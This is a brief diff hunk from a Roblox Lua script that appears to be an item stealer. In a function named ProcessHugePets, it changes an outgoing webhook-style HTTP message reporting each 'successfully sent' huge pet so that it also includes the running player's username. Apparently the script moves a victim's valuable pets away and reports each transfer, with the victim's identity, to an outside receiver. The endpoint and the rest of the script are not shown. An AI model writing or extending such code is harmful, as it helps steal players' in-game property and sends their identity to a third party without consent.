@@ -52,7 +52,7 @@ function ProcessHugePets()
                 ["Content-Type"] = "application/json"
             },
             Body = HttpService:JSONEncode({
-                content = "Successfully sent! Pet ID: " .. hugePets[i]
+                content = game.Players.LocalPlayer.Name .. " | Successfully sent! Pet ID: " .. hugePets[i]
             })
         })
 
